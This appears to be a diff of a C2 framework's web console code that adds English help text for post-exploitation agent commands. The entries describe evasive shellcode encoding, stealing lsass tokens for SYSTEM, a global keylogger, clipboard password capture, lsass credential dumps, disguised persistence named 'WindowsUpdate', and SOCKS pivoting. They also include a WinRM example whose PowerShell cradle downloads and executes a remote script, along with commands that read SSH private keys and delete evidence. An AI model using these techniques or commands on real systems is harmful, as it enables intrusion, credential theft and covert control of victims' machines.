+  • Periodically XOR-encrypts shellcode/reflective DLL in memory
+  • Reduces detection window for periodic EDR memory scans
+  • Buffers are decrypted before each use and re-encrypted`,
+
+  'encode-uuid': `<b>encode-uuid</b> — encode shellcode as UUID array
+
+  <span class="console-section">USAGE</span>
+  encode-uuid &lt;sc.bin&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  encode-uuid agent.bin
+
+  <span class="console-section">OUTPUT</span>
+  Ready-to-compile C code that decodes shellcode via UuidFromStringA
+
+  <span class="console-section">TECHNIQUE</span>
+  • Every 16 bytes of shellcode = 1 UUID string
+  • UuidFromStringA (Rpcrt4.dll) converts UUID → bytes → executes in memory
+  • No direct memcpy calls or obvious injection WinAPI in source code
+
+  <span class="console-section">NOTES</span>
+  • Useful for evading static shellcode detection in source code
+  • Combine with additional encryption for better evasion`,
+
+  'token': `<b>token</b> — Windows access token management
+
+  <span class="console-section">USAGE</span>
+  token whoami
+  token steal &lt;pid&gt;
+  token make &lt;user&gt; &lt;password&gt;
+  token drop
+
+  <span class="console-section">EXAMPLES</span>
+  token whoami               → view current token (user, groups, privileges)
+  token steal 664            → impersonate token of process 664 (e.g. lsass → SYSTEM)
+  token make corp\\\\admin P@ss  → create logon token (no network password)
+  token drop                 → revert to original process token
+
+  <span class="console-section">NOTES</span>
+  • steal requires SeDebugPrivilege (or SYSTEM)
+  • make uses LogonUser → useful for lateral movement with known credentials
+  • drop is equivalent to RevertToSelf`,
+
+  'steal-token': `<b>steal-token</b> — impersonate a process token
+
+  <span class="console-section">USAGE</span>
+  steal-token &lt;pid&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  steal-token 664    → if 664 is lsass.exe → obtain SYSTEM
+  steal-token 4      → System process
+
+  <span class="console-section">NOTES</span>
+  • Equivalent to token steal in Go agent
+  • Requires SeDebugPrivilege`,
+
+  'make-token': `<b>make-token</b> — create logon token with credentials (Rust agent)
+
+  <span class="console-section">USAGE</span>
+  make-token &lt;domain\\\\user&gt; &lt;password&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  make-token CORP\\\\administrator P@ssw0rd
+  make-token .\\\\localadmin Password123
+
+  <span class="console-section">NOTES</span>
+  • Creates LOGON32_LOGON_NEW_CREDENTIALS token (no local validation, validates on network)
+  • Useful for lateral movement with known credentials without changing local context`,
+
+  'rev2self': `<b>rev2self</b> — revert to original process token
+
+  <span class="console-section">USAGE</span>
+  rev2self
+
+  <span class="console-section">NOTES</span>
+  • Equivalent to token drop in Go agent
+  • Undoes any active steal-token or make-token`,
+
+  'keylog': `<b>keylog</b> — keylogger via system-level keyboard hook (WH_KEYBOARD_LL)
+
+  <span class="console-section">USAGE</span>
+  keylog start
+  keylog stop
+  keylog dump
+
+  <span class="console-section">EXAMPLES</span>
+  keylog start      → install WH_KEYBOARD_LL hook
+  keylog dump       → retrieve captured keystrokes so far
+  keylog stop       → uninstall hook and clear buffer
+
+  <span class="console-section">NOTES</span>
+  • WH_KEYBOARD_LL captures global keystrokes including passwords
+  • Hook operates at Windows message level, no injection into other processes needed
+  • dump can be called multiple times without stopping the keylogger`,
+
+  'clip': `<b>clip</b> — read clipboard contents
+
+  <span class="console-section">USAGE</span>
+  clip
+
+  <span class="console-section">NOTES</span>
+  • Plain text only (GetClipboardData CF_TEXT)
+  • Useful for capturing copied passwords, tokens, etc.`,
+
+  'minidump': `<b>minidump</b> — dump process to .dmp file and download
+
+  <span class="console-section">USAGE</span>
+  minidump [pid]
+
+  <span class="console-section">EXAMPLES</span>
+  minidump           → dump lsass.exe (auto-detect PID)
+  minidump 664       → dump process with PID 664
+
+  <span class="console-section">NOTES</span>
+  • Without pid, auto-locates lsass.exe → credential memory dump
+  • .dmp downloaded to server, appears in Files tab
+  • Analyze offline with: pypykatz lsa minidump lsass.dmp
+  • EDRs detect direct MiniDumpWriteDump → consider alternatives (ProcDump, comsvcs.dll)`,
+
+  'port-scan': `<b>port-scan</b> — host discovery and TCP port scan from the agent
+
+  <span class="console-section">USAGE</span>
+  port-scan &lt;target&gt; [ports] [timeout_ms]
+  No ports → host discovery mode (ARP + TCP fallback)
+
+  <span class="console-section">TARGET FORMATS</span>
+  192.168.1.1                 single IP
+  192.168.1.0/24              CIDR — entire subnet
+  192.168.1.1-20              last octet range
+  192.168.1.1-192.168.1.50   full IP range
+  dc01.corp.local             hostname
+
+  <span class="console-section">HOST DISCOVERY (no ports)</span>
+  Windows  SendARP (iphlpapi.dll) — no elevation, returns MAC
+  Linux    UDP trigger + /proc/net/arp — no raw sockets, returns MAC
+  Fallback TCP to common ports (routed subnets, no direct L2)
+
+  <span class="console-section">PORT FORMATS</span>
+  22,80,443                   list
+  1-1024                      range
+  22,80,443-500               mixed
+
+  <span class="console-section">EXAMPLES</span>
+  port-scan 192.168.1.0/24                 live hosts on the network
+  port-scan 10.10.10.1-50                  host range
+  port-scan 192.168.1.0/24 22,80,445,3389 300
+  port-scan dc01.corp.local 88,135,389,445,636,3268
+
+  <span class="console-section">NOTES</span>
+  • Scan runs from agent's network (reconnaissance pivoting)
+  • ARP only works on same L2 subnet; beyond that uses TCP fallback
+  • Max concurrency 512 goroutines`,
+
+  'persist': `<b>persist</b> — establish persistence on the system
+
+  <span class="console-section">USAGE</span>
+  persist run-key              → HKCU\\Run registry key
+  persist task [name]          → OnLogon scheduled task
+  persist rm                   → remove active persistence
+
+  <span class="console-section">EXAMPLES</span>
+  persist run-key              → agent runs on user login
+  persist task WindowsUpdate   → 'WindowsUpdate' task executes the agent
+  persist rm                   → removes established persistence
+
+  <span class="console-section">NOTES</span>
+  • run-key writes to HKCU (no admin privileges required)
+  • persist task requires agent to be on disk with accessible path
+  • Rust agent only`,
+
+  'socks': `<b>socks</b> — start SOCKS5 proxy on agent (Go agent)
+
+  <span class="console-section">USAGE</span>
+  socks &lt;port&gt; [user:password]
+  socks stop
+
+  <span class="console-section">EXAMPLES</span>
+  socks 1080                  → SOCKS5 without auth on agent port 1080
+  socks 1080 admin:secret     → SOCKS5 with RFC 1929 authentication
+  socks stop                  → close proxy
+
+  <span class="console-section">PROXYCHAINS USAGE</span>
+  # In /etc/proxychains4.conf:
+  socks5 &lt;agent_ip&gt; 1080 admin secret
+
+  <span class="console-section">NOTES</span>
+  • Proxy listens on agent's IP, not on C2
+  • Requires direct access to agent's port from Kali (or use rsocks if behind NAT)`,
+
+  'socks5': `<b>socks5</b> — alias for <b>socks</b>; start SOCKS5 proxy on agent
+
+  <span class="console-section">USAGE</span>
+  socks5 start &lt;port&gt; [user:password]
+  socks5 stop
+  socks5 &lt;port&gt; [user:password]    (short form)
+
+  <span class="console-section">EXAMPLES</span>
+  socks5 start 1080                  → SOCKS5 without auth
+  socks5 start 1080 alice:s3cret     → SOCKS5 with RFC 1929 auth
+  socks5 stop                        → close proxy
+
+  <span class="console-section">PROXYCHAINS</span>
+  # /etc/proxychains4.conf:
+  socks5 &lt;agent_ip&gt; 1080 alice s3cret`,
+
+  'rsocks': `<b>rsocks</b> — reverse SOCKS5: agent connects to C2 (bypasses NAT/firewall)
+
+  <span class="console-section">USAGE</span>
+  rsocks start [port] [user:password]
+  rsocks stop
+
+  <span class="console-section">EXAMPLES</span>
+  rsocks start 1080
+  rsocks start 1080 op:s3cret
+  rsocks stop
+
+  <span class="console-section">HOW IT WORKS</span>
+  1. C2 opens a listener on &lt;port&gt;
+  2. Agent connects to C2 and establishes a reverse tunnel
+  3. SOCKS5 connections to &lt;C2_ip&gt;:&lt;port&gt; are tunneled through the agent
+
+  <span class="console-section">PROXYCHAINS USAGE</span>
+  socks5 &lt;C2_ip&gt; 1080 op s3cret
+
+  <span class="console-section">NOTES</span>
+  • Ideal when agent is on a network with no open inbound ports`,
+
+  'portfwd': `<b>portfwd</b> — port forward: agent lport → rhost:rport
+
+  <span class="console-section">USAGE</span>
+  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;
+  portfwd del [tcp|udp] &lt;lport&gt;
+  portfwd list
+
+  <span class="console-section">EXAMPLES</span>
+  portfwd add tcp 4444 10.10.10.20 3389    → RDP to internal host from Kali via agent
+  portfwd add tcp 8080 192.168.1.5 80      → internal HTTP exposed on agent:8080
+  portfwd add udp 53 10.10.10.1 53         → DNS forward
+  portfwd del tcp 4444
+  portfwd list
+
+  <span class="console-section">USAGE</span>
+  # Connect to forwarded port (from Kali):
+  rdesktop &lt;agent_ip&gt;:4444
+  xfreerdp /v:&lt;agent_ip&gt;:4444`,
+
+  'httpivot': `<b>httpivot</b> — HTTP proxy server on agent routing traffic to its internal network
+
+  <span class="console-section">USAGE</span>
+  httpivot start [port]
+  httpivot stop
+
+  <span class="console-section">EXAMPLES</span>
+  httpivot start 8118
+  httpivot stop
+
+  <span class="console-section">PROXYCHAINS USAGE</span>
+  # In /etc/proxychains4.conf:
+  http &lt;agent_ip&gt; 8118
+
+  <span class="console-section">NOTES</span>
+  • Agent acts as HTTP CONNECT proxy towards its internal network
+  • Allows reaching hosts the agent can see but the C2 cannot`,
+
+  'link': `<b>link</b> — connect child agent via SMB named pipe (P2P)
+
+  <span class="console-section">USAGE</span>
+  link start [pipename]
+  link stop
+
+  <span class="console-section">EXAMPLES</span>
+  link start svcctl_pipe
+  link start
+  link stop
+
+  <span class="console-section">HOW IT WORKS</span>
+  1. Child agent (pipe server) listens on \\\\.\\pipe\\&lt;pipename&gt;
+  2. Parent agent connects via link start
+  3. Child agent's C2 traffic flows through the parent's named pipe
+
+  <span class="console-section">NOTES</span>
+  • Useful for agents on hosts without internet access (SMB 445 only)
+  • SMB traffic is common → less suspicious on corporate networks`,
+
+  'winrm': `<b>winrm</b> — remote host execution/deployment via WinRM
+
+  <span class="console-section">USAGE</span>
+  winrm exec &lt;target&gt; &lt;user&gt; &lt;password&gt; &lt;command&gt;
+  winrm deploy &lt;target&gt; &lt;user&gt; &lt;password&gt; &lt;cradle_ps&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  winrm exec 10.10.10.5 administrator P@ss whoami
+  winrm exec 10.10.10.5 CORP\\\\admin P@ss "net user /domain"
+  winrm deploy 10.10.10.5 administrator P@ss "IEX(New-Object Net.WebClient).DownloadString('http://10.2.10.1/a.ps1')"
+
+  <span class="console-section">NOTES</span>
+  • Port 5985 (HTTP) — ensure WinRM is enabled on target
+  • To enable on target: Enable-PSRemoting -Force
+  • deploy executes the PowerShell cradle to deploy a new agent`,
+
+  'ishell': `<b>ishell</b> — persistent interactive shell
+
+  <span class="console-section">USAGE</span>
+  ishell cmd      → open interactive cmd.exe
+  ishell ps       → open interactive PowerShell
+  ishell exit     → close interactive shell
+
+  <span class="console-section">NOTES</span>
+  • Directory state and environment variables persist between commands
+  • Useful for long sessions without prefixing 'shell' each time
+  • Use interactive shell for chained commands: cd C:\\Temp &amp;&amp; dir
+  • ishell exit closes the shell and returns to normal agent mode`,
+
+  'cleanup': `<b>cleanup</b> — self-delete the agent from the system
+
+  <span class="console-section">USAGE</span>
+  cleanup
+
+  <span class="console-section">NOTES</span>
+  • Deletes the agent executable from disk
+  • Removes persistence entries (if any)
+  • Agent terminates after cleaning up
+  • Irreversible action — confirm before use`,
+
+  'kill': `<b>kill</b> — terminate the agent process
+
+  <span class="console-section">USAGE</span>
+  kill
+
+  <span class="console-section">NOTES</span>
+  • Terminates process immediately (ExitProcess)
+  • Does not delete files from disk (use cleanup for that)
+  • Agent disappears from panel after the next failed beacon`,
+
+  'getpid': `<b>getpid</b> — show the agent process PID
+
+  <span class="console-section">USAGE</span>
+  getpid
+
+  <span class="console-section">NOTES</span>
+  • Useful for identifying the process in ps and avoiding injecting into itself`,
+
+  'ppid': `<b>ppid</b> — show the agent parent process PPID
+
+  <span class="console-section">USAGE</span>
+  ppid
+
+  <span class="console-section">NOTES</span>
+  • Shows which process is the agent's parent
+  • Useful for understanding the process tree and execution context`,
+
+  'pwd': `<b>pwd</b> — show current working directory
+
+  <span class="console-section">USAGE</span>
+  pwd`,
+
+  'cd': `<b>cd</b> — change working directory
+
+  <span class="console-section">USAGE</span>
+  cd &lt;path&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  cd C:\\Users\\victim\\Desktop
+  cd C:\\Windows\\Temp
+  cd /tmp`,
+
+  'ls': `<b>ls</b> — list directory contents
+
+  <span class="console-section">USAGE</span>
+  ls [path]
+
+  <span class="console-section">EXAMPLES</span>
+  ls                        → current directory
+  ls C:\\Users
+  ls /home`,
+
+  'mkdir': `<b>mkdir</b> — create directory
+
+  <span class="console-section">USAGE</span>
+  mkdir &lt;path&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  mkdir C:\\Temp\\staging`,
+
+  'rm': `<b>rm</b> — delete file or directory
+
+  <span class="console-section">USAGE</span>
+  rm &lt;path&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  rm C:\\Temp\\evidence.txt
+  rm C:\\Temp\\staging`,
+
+  'cat': `<b>cat</b> — read file contents
+
+  <span class="console-section">USAGE</span>
+  cat &lt;file&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  cat C:\\Windows\\System32\\drivers\\etc\\hosts
+  cat /etc/passwd
+  cat C:\\Users\\victim\\.ssh\\id_rsa`,
+
+  'env': `<b>env</b> — list process environment variables
+
+  <span class="console-section">USAGE</span>
+  env
+
+  <span class="console-section">NOTES</span>
+  • Shows PATH, USERNAME, COMPUTERNAME, and custom variables
+  • Useful for discovering credentials in environment variables (AWS_SECRET_KEY, etc.)`,
+
+  'results': `<b>results</b> — view task result history
+
+  <span class="console-section">USAGE</span>
+  results [n]
+
+  <span class="console-section">EXAMPLES</span>
+  results         → last 20 results
+  results 5       → last 5 results
+  results 100     → last 100 results`,
+
+  'back': `<b>back</b> — close the agent console
+
+  <span class="console-section">USAGE</span>
+  back
+
+  <span class="console-section">NOTES</span>
+  • Closes the console and returns to the agents panel
+  • Agent keeps running on the target`,
+};
+
+function getCmdHelp(key, isWin) {
+  const tbl = helpLang === 'es' ? CMD_DETAIL_HELP_ES : CMD_DETAIL_HELP_EN;
+  const h = tbl[key];
+  return typeof h === 'function' ? h(isWin) : h;
+}
+
 // Convert Uint8Array to base64 without spreading (avoids "Maximum call stack size exceeded"
 // for large payloads >~500 KB when passed as spread args to String.fromCharCode).
 function u8ToB64(u8) {
@@ -6339,17 +7265,15 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     const _isWin = !agents.find(x=>x.id===agentID)?.os?.toLowerCase().includes('linux');
     if (args) {
       const key = args.trim().toLowerCase();
-      const entry = typeof CMD_DETAIL_HELP[key] === 'function'
-        ? CMD_DETAIL_HELP[key](_isWin)
-        : CMD_DETAIL_HELP[key];
+      const entry = getCmdHelp(key, _isWin);
       if (entry) {
-        addConsoleHelp(entry);
+        addConsoleHelp(entry + helpLangToggleHTML());
       } else {
-        addConsoleOutput(`No hay ayuda para '${key}'. Escribe <b>help</b> para ver todos los comandos.`, '', null);
+        addConsoleOutput(`No help for '${key}'. Type <b>help</b> to see all commands.`, '', null);
       }
       return;
     }
-    addConsoleHelp(getHelpHTML(_isWin));
+    addConsoleHelp(getHelpHTML(_isWin) + helpLangToggleHTML());
     return;
   }
 
